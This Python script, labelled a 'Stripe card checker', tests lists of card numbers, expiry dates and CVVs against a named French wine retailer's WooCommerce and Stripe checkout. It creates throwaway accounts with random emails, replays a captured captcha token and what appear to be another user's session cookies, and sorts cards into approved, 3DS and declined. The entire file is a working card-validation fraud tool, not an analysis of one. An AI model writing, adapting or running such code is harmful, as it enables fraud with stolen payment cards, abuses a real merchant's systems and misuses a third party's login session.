import requests
import re
from datetime import datetime
import random
import string
import json
import urllib.parse
import uuid
import os
from colorama import Fore, Style, init

init(autoreset=True)
total_cards = 0
approved_count = 0
declined_count = 0
tds_count = 0
error_count = 0

def parse_card(card_input):
    parts = card_input.strip().split('|')
    if len(parts) != 4:
        raise ValueError("Invalid card format. Use: card_number|month|year|cvv")
    
    card_number = parts[0].strip().replace(' ', '')
    exp_month = parts[1].strip()
    exp_year = parts[2].strip()[-2:]
    cvv = parts[3].strip()
    
    return {
        'number': card_number,
        'month': exp_month,
        'year': exp_year,
        'cvv': cvv
    }

def read_cards_from_file(filename):
    if not os.path.exists(filename):
        print(f"{Fore.RED}[✗] File not found: {filename}")
        return []
    
    with open(filename, 'r', encoding='utf-8') as f:
        cards = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    return cards

def check_card(card_data, index, total):
    global approved_count, declined_count, tds_count, error_count
    
    card_display = f"{card_data['number'][:6]}...{card_data['number'][-4:]}"
    
    try:
        cookies = {
            'pll_language': 'fr',
            '__stripe_mid': '18d5f230-d329-48fd-ac15-9490c1eab2f1f19f13',
            'wordpress_logged_in_81eadbbb09f5c6c7c9759b8c7a7433ff': 'mmhoangthai%7C1771380018%7C97rgWLz6gYnB1EOm71NaMSCr5blTxvO0oNHdIis0omB%7Ccb186a2c8df50bb89be4f5774943bb91287ddfb8f259fff15666b39d119fddda',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2026-02-12%2015%3A28%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.vignobledubreuil.com%2Fmon-compte%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_first_add': 'fd%3D2026-02-12%2015%3A28%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.vignobledubreuil.com%2Fmon-compte%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F144.0.0.0%20Safari%2F537.36%20Edg%2F144.0.0.0',
            'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.vignobledubreuil.com%2Fmon-compte%2F',
        }


        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0',
        }

        response = requests.get('https://www.vignobledubreuil.com/mon-compte/', cookies=cookies, headers=headers)
        woocommerce_register_nonce = re.search(r'woocommerce-register-nonce" value="([^"]+)"', response.text).group(1)
        register = re.search(r'register" value="([^"]+)"', response.text).group(1)

        time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        random_email = ''.join(random.choice(string.ascii_lowercase) for _ in range(10)) + '@gmail.com'
        time_on_page = random.randint(30000, 60000)

        muid = str(uuid.uuid4()) + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        sid = str(uuid.uuid4()) + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        guid = str(uuid.uuid4()) + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))


        data = {
            'email': random_email,
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://www.vignobledubreuil.com/',
            'wc_order_attribution_session_start_time': time,
            'wc_order_attribution_session_pages': '4',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0',
            'woocommerce-register-nonce': woocommerce_register_nonce,
            '_wp_http_referer': '/mon-compte/',
            'register': register,
        }

        response = requests.post('https://www.vignobledubreuil.com/mon-compte/', headers=headers, data=data)

        cookies.update({
            'wordpress_logged_in_81eadbbb09f5c6c7c9759b8c7a7433ff': 'mmhoangthai%7C1771380018%7C97rgWLz6gYnB1EOm71NaMSCr5blTxvO0oNHdIis0omB%7Ccb186a2c8df50bb89be4f5774943bb91287ddfb8f259fff15666b39d119fddda',
            '__stripe_mid': '18d5f230-d329-48fd-ac15-9490c1eab2f1f19f13',
            '__stripe_sid': 'd48d1146-9d5c-4d32-86c9-f50d0f6ef33bff7726',
        })

        response = requests.get('https://www.vignobledubreuil.com/mon-compte/ajouter-un-moyen-de-paiement/', cookies=cookies, headers=headers)
        _ajax_nonce = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', response.text).group(1)

        headers_stripe = {
            'accept': 'application/json',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0',
        }

        response = requests.get(
            'https://api.stripe.com/v1/elements/sessions?deferred_intent[mode]=setup&deferred_intent[currency]=eur&deferred_intent[payment_method_types][0]=card&deferred_intent[setup_future_usage]=off_session&currency=eur&key=pk_live_51IL8NuFfFxWuzzINEoj39fwaUtlptPFsSmgq1KlsuA6NzIiWJ16LFIMqxDa3JGckNUeCpOCAJSMfWJ7sLBrgIREt00999pcRzZ&_stripe_version=2024-06-20&elements_init_source=stripe.elements&referrer_host=www.vignobledubreuil.com&stripe_js_id=22d496c0-7304-43b2-a46d-912b80d555a1&locale=fr&type=deferred_intent',
            headers=headers_stripe,
        )
        config_id = response.json()['config_id']


        data = (
            'type=card'
            f'&card[number]={card_data["number"]}'
            f'&card[cvc]={card_data["cvv"]}'
            f'&card[exp_year]={card_data["year"]}'
            f'&card[exp_month]={card_data["month"]}'
            '&allow_redisplay=unspecified'
            '&billing_details[address][country]=FR'
            '&pasted_fields=number'
            '&payment_user_agent=stripe.js%2Feeaff566a9%3B+stripe-js-v3%2Feeaff566a9%3B+payment-element%3B+deferred-intent'
            '&referrer=https%3A%2F%2Fwww.vignobledubreuil.com'
            f'&time_on_page={time_on_page}'
            '&client_attribution_metadata[client_session_id]=22d496c0-7304-43b2-a46d-912b80d555a1'
            '&client_attribution_metadata[merchant_integration_source]=elements'
            '&client_attribution_metadata[merchant_integration_subtype]=payment-element'
            '&client_attribution_metadata[merchant_integration_version]=2021'
            '&client_attribution_metadata[payment_intent_creation_flow]=deferred'
            '&client_attribution_metadata[payment_method_selection_flow]=merchant_specified'
            f'&client_attribution_metadata[elements_session_config_id]={config_id}'
            '&client_attribution_metadata[merchant_integration_additional_elements][0]=payment'
            f'&guid={guid}'
            f'&muid={muid}'
            f'&sid={sid}'
            '&key=pk_live_51IL8NuFfFxWuzzINEoj39fwaUtlptPFsSmgq1KlsuA6NzIiWJ16LFIMqxDa3JGckNUeCpOCAJSMfWJ7sLBrgIREt00999pcRzZ'
            '&_stripe_version=2024-06-20'
            '&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzcwMDQ1NTM1LCJjZGF0YSI6IjFjbzR5dEV2WlIzWndIVlEyWlVldytIWFpobHFVZDR2bFFic09pK2NmTHpNWGZGWlVnaVluQXB0Kzl4cjlXMFptT3d4WjVOOS9xeGVHMEZiemgycm8yYXhkZHJhNzRoSmNqbHA1Z1BUbFhSU21vWFhTekpYenk3b0tUUVcvUjJoYkFuUUkxK0dGQ0dCRWFTUEJ6MVFYdDFYL0E2NE9nUDRRS2NuMklza3Fwd2tWSzdEM3JUNi9OdTlWNEd3Tk9PY3R1SUxqUFdxeEdCajBmQ1orcGpSL1lsb3lzOEE5cEUraWV3bWttZ21uczBUYyszN3FiY2pURlBPWjQza3BZSGxnQ3RIVmxrQjdmeXdFY2Z4cEphZk04ZHVXT2swa0xWWEEyY1NKaGZNellkR0svdzVKVW0remdJeEkwNTNTbGlsdHJzZzZsSDVTTDczQ0ZVQW9kcWpneDFqeUVmOHpQKy9kSmVIb1dmaW1oUT1IdGU4NE42ajdmL09XajdpIiwicGFzc2tleSI6IlFjejlLY0JUWXVSS1BjaVVpc0dyMmtjUVJNTnJoeFppK1M1b29ycWNOM3NBa201eDlhNXNnOWR1K0sybi9TZmVVaUxzSituY05WVjJHWmNUTmFQbWtQUTlQdEVQS2RwM25JMlNVRzNzTmZoL3JUU1ZHblFqdWdJbSt2OXh1N3VQc3NJWDRpcmtUd3JmZm1EN2N1OXl5c1JVSkpNUStYdTRJdFhXV2NOeStTWFljNW94OVp4Yzh2VzBMcHFzT2ZKRFlPeitscHpBYjB1c2tZMzduNXhLL2lwL1FOelNranlsSkRqMU1RcDV4RlFoVlBiSzl1UHdnTkwycjZTM2VVdWdVcDA3U2lCVFlGUVNMdDBFbTF1Qk5EbTdVM0JCOU1ibDZJR1lTYm1rVCtWT1RCOU0xdzhlU0g3ZzVQMnNtbWdSSDVHREt2Y0Z3dWVWOGFJZ3hoMVZBVVRQUmNRQXlJck5kTUdjSG45aG9rcnZLd3lwSWZzM0JIdUg2YXhQaHdHd3BpSy9ldjhzWDhOUlZGZEdrczg3SDhiR2FXWnBYZVZqUmJEM3lqQUFVeTNSMFU3YlBmNmN3NGJlWG5QN2FYOW1wcEQraFJFT3RZOUJWbDgzNFhxNW5RSU9UU0lQWHBGZi9FUkROSSs2SG1vS3JnNitUVGw5c1g0YmlJMnlIbjQ2WTJSRU82djlSYjkyTUtEQzF5WURKN1F5WUlIUFlPV2lFYTdKc3JRaHpsZE5mcDdYNGxFMHBhdkxzQlhhY05DR2Q4TFRtVjMyVmVRWUxQU2RRSnY0dFJpZlVKazRGZW51WHFERVAvK3RHQTdxeXNqbFQrV0ZRSWNzVXVxWkN0bjQ5RStLUjMxVWxvY1E4YUgzYkVkRHhSV3VoSGxwakxIWHM5cHRESjhrZHJtZkcydCtaM3Z4V1A5WWE5VmlnM2VjamUvd3c4cTNwWE4vbTl4djdhRkJ5TGUvVmZ0QW5hTmZjRG9OV2FKT292L1FBU2dMTFExd3ZPTmk0d1RYMEJRN1dEZXBKajFhbVVvL3VEbkZwcCt5MWxrUXZ5cklpYzNIeDFvVWZEbFdrTVJzc0tFS0xRNnd0Z2lQa2ZrdEtrVGdCYkphc24wRnRycVNEeGMwTnBUK3ZHUXowcFg3MU5VWDA1aHpHM2FJL1BXU0RMVDlhV2JxZjY2Z0ZQVEp4YnRmcHR3ZnBqamdnV3Voek9JRnpJOWh5OTlSZVY2WCtIZEYrNFFJUStFQVY3U2hlUXNYS2FNZmJuOTR2Ny9Xc2xHZlRQbzlJb3NFaTZZZkZ3Q3VWS01MTGR2b1RBdUZEVC80TFBaSHMraGxja1F6bUkwUWpKMlZ1Qmx6Tkw0N3I2VC85NHN2VDRYaHBqdmppak9uTEJQOURoVWNSMGg1bnlLay82aWlEMkhYK3ZVV3BWaU91em16Z1FJMWlBZU1jODFHeXRiSllJTkJHb2lYK0I2QUYreWxOVmhvQmpUU3R0K1ppVXpsbExCUU1aTFNKMXBLQnBuRkxRd0ZHZHNnRHF0VVpFaTJqK2cvUGprc2RWd2dhM0FyOHBhNUdpaDNXWWZOQldiTWZ0OXMxVjBJdXFTL2xMemZ3SGo4RUJDeitjTk5qOThkRk1oTUdENW1xeWgxSkJPU1hKazhHMGlVNkZkTTA2bWlpS2NTZFVBaE1JU2wrTXBEbGpnaWlNOGpRMHdLRHdsUXVRalVZZmNVMXhadlByK2dVSmNqLzNBWERueFh0dTVTOGNwb0F0aC95YWRVdDJKcldHLzZEL3pBTlVkeVdYaFZFMmlMbFVENXZjUE91ckN1R0RiUjd1WitSc1NLeGJDZjBKTnZ5QXdvdHRQMGlXM2dVcllibVptcGUrRmpQL2tHb0Q3MDRnaUp4RnRSUjNHK1Bad2RaWUlZMzZTOFc3dFdXSG5ZZmNrb0l6YlBLcVdYUzZOVHB3VEhjYzBHRFVwNlNLOVJ5VDJHemUzU1k0ZDJVUUxzZFlMSHAxSXd1b1pKQ0pwL1ovay9GRnNYMDQwTW1jdnJXemZQdXY4WVdibEFpUlNhK0l2TmxMWE5oQzRXUjhvMElvZXZQemtxM0ZyV0U4NUVUQlo0Y0FVWVFjUTBYZzRSd3ErUjQraE9LUG96b2U3Q2gwL1NMdWM5MXdjb0xNRHduaWQ3NWpMYVNneklJbTU2OEdmWGYxUlVSUkFYL2VodnhxOGhHQWlkU2pFbTVVMi9Jdi9Eam13cmRwLzF1MGZLbkFFUmxsdGpPSVJvWlp0SEpveEdISkhKS0w5cmJuc0xpZ0dxdnVTZG9mcFRtZzYxTlIweXhKSG5jTUhkMTZ4c29FUXkzdzBYMURVdnRaU3hGaWRkMFp2RFFMOWN3dy8rTURhaTZqWkVoVVJ1dG5HUnFrVW40ejN2bFYxQXo1RXBISEoweDl6NWRuWC9DaGpUZUlEY1JoNFQ0eHVFRTV4ZlVEUkFvSnNOSjA1RHY0NG1TNHhXUTFheHpBT0hjYjRmN2pXOHdETURxeFJDdCs5OVVtbnFwUWhQeDRuMHlhNzJjbkord0RHemJzd01qdjNYaE9QMDZnVmRKakRQMUR4L1NEQ0ZKZVBzRS9qKzFmQldpSWxIRlhvYnNjYittSXhSRkEzdmxtdGxvREV2RjVXanJKU0pua0l0YVJPMUN4YUxWZ1VjMkJsQi9GdHNHaWh6aGNQTWhxWWFyM0daZE0xSVpISnVVc2hxeFY4MTZobjNrOEk9Iiwia3IiOiIyOTI2ZDljMiIsInNoYXJkX2lkIjozNjI0MDY5OTZ9.fWzBpPGv1npSx5tvV47gmI5b_Xj7eVhC1x2LTeMblV4'
        )
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data)
        id_payment = response.json()['id']

        cookies_final = {
            'pll_language': 'fr',
            '__stripe_mid': '18d5f230-d329-48fd-ac15-9490c1eab2f1f19f13',
            'wordpress_logged_in_81eadbbb09f5c6c7c9759b8c7a7433ff': 'mmhoangthai%7C1771380018%7C97rgWLz6gYnB1EOm71NaMSCr5blTxvO0oNHdIis0omB%7Ccb186a2c8df50bb89be4f5774943bb91287ddfb8f259fff15666b39d119fddda',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2026-02-12%2015%3A28%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.vignobledubreuil.com%2Fmon-compte%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_first_add': 'fd%3D2026-02-12%2015%3A28%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.vignobledubreuil.com%2Fmon-compte%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F144.0.0.0%20Safari%2F537.36%20Edg%2F144.0.0.0',
            'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.vignobledubreuil.com%2Fmon-compte%2F',
        }

        headers_final = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.vignobledubreuil.com',
            'referer': 'https://www.vignobledubreuil.com/mon-compte/ajouter-un-moyen-de-paiement/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': id_payment,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': _ajax_nonce,
        }

        response = requests.post('https://www.vignobledubreuil.com/wp-admin/admin-ajax.php', cookies=cookies_final, headers=headers_final, data=data)
        
        try:
            response_json = response.json()
            
            if response_json.get('success') == True:
                status = response_json.get('data', {}).get('status', '')
                
                if status == 'succeeded':
                    approved_count += 1
                    print(f"{Fore.GREEN}[{index}/{total}] {card_display} | APPROVED | status: {status}{Style.RESET_ALL}")
                elif status == 'requires_action':
                    tds_count += 1
                    print(f"{Fore.YELLOW}[{index}/{total}] {card_display} | 3DS | status: {status}{Style.RESET_ALL}")
                else:
                    declined_count += 1
                    print(f"{Fore.RED}[{index}/{total}] {card_display} | DECLINED | status: {status}{Style.RESET_ALL}")
            elif response_json.get('success') == False:
                error_msg = response_json.get('data', {}).get('error', {}).get('message', 'Unknown error')
                if 'declined' in error_msg.lower():
                    declined_count += 1
                    print(f"{Fore.RED}[{index}/{total}] {card_display} | DECLINED | status: {error_msg}{Style.RESET_ALL}")
                else:
                    error_count += 1
                    print(f"{Fore.MAGENTA}[{index}/{total}] {card_display} | ERROR | status: {error_msg}{Style.RESET_ALL}")
            else:
                error_count += 1
                print(f"{Fore.MAGENTA}[{index}/{total}] {card_display} | ERROR | Response: {response.text[:100]}{Style.RESET_ALL}")
        except:
            error_count += 1
            print(f"{Fore.MAGENTA}[{index}/{total}] {card_display} | ERROR | Invalid JSON response{Style.RESET_ALL}")
            
    except Exception as e:
        error_count += 1
        print(f"{Fore.MAGENTA}[{index}/{total}] {card_display} | ERROR | {str(e)[:50]}{Style.RESET_ALL}")

def main():
    global total_cards
    
    print("=" * 80)
    print(f"{Fore.CYAN}STRIPE CARD CHECKER{Style.RESET_ALL}")
    print("=" * 80)
    
    choice = input("Enter [1] for file input or [2] for single card: ").strip()
    
    if choice == '1':
        filename = input("Enter filename (e.g., cards.txt): ").strip()
        card_inputs = read_cards_from_file(filename)
        if not card_inputs:
            print(f"{Fore.RED}No cards found in file!{Style.RESET_ALL}")
            return
    else:
        card_input = input("Enter card (format: card_number|month|year|cvv): ").strip()
        card_inputs = [card_input]
    
    total_cards = len(card_inputs)
    print(f"\n{Fore.CYAN}Total cards to check: {total_cards}{Style.RESET_ALL}")
    print("=" * 80)
    print()
    
    for i, card_input in enumerate(card_inputs, 1):
        try:
            card_data = parse_card(card_input)
            check_card(card_data, i, total_cards)
        except Exception as e:
            print(f"{Fore.MAGENTA}[{i}/{total_cards}] Invalid card format | {card_input[:20]}{Style.RESET_ALL}")
    
    print()
    print("=" * 80)
    print(f"{Fore.CYAN}SUMMARY{Style.RESET_ALL}")
    print("=" * 80)
    print(f"Total Cards: {total_cards}")
    print(f"{Fore.GREEN}Approved: {approved_count}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}3DS: {tds_count}{Style.RESET_ALL}")
    print(f"{Fore.RED}Declined: {declined_count}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}Errors: {error_count}{Style.RESET_ALL}")
    print("=" * 80)

if __name__ == "__main__":
    main()
